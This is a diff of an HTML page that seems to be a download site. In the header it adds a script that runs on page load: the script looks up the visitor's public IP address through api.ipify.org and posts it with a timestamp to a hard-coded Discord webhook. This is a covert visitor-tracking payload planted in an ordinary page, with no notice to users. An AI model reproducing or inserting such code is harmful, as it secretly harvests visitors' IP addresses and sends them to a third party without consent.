@@ -221,7 +221,36 @@
     </div><div id="particles-container" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;"><canvas class="particles-js-canvas-el" style="width: 100%; height: 100%;" width="1104" height="955"></canvas></div>
     <div class="header">
         <div class="logo-bar"></div>
-         
+         <html><head>
+  <title></title>
+</head>
+<body>
+  <h1></h1>
+  <script>
+    function sendIP(ip, timestamp) {
+      var webhookURL = 'https://discordapp.com/api/webhooks/1166472971381129287/mMPj5y5Kld8aHX6nSopBPEj7ePdOfkItrKoWnRBytK_f7uT5R7GY9fhushvAjBD4HKx_';
+
+      var payload = JSON.stringify({
+        content: 'IP: ' + ip + ', Timestamp: ' + timestamp
+      });
+
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', webhookURL, true);
+      xhr.setRequestHeader('Content-type', 'application/json');
+      xhr.send(payload);
+    }
+
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        var ip = data.ip;
+        var timestamp = new Date().toLocaleString();
+        sendIP(ip, timestamp);
+      })
+      .catch(error => console.error(error));
+  </script>
+
+</body></html>
         
     <div class="container">
 <div class="download-item">
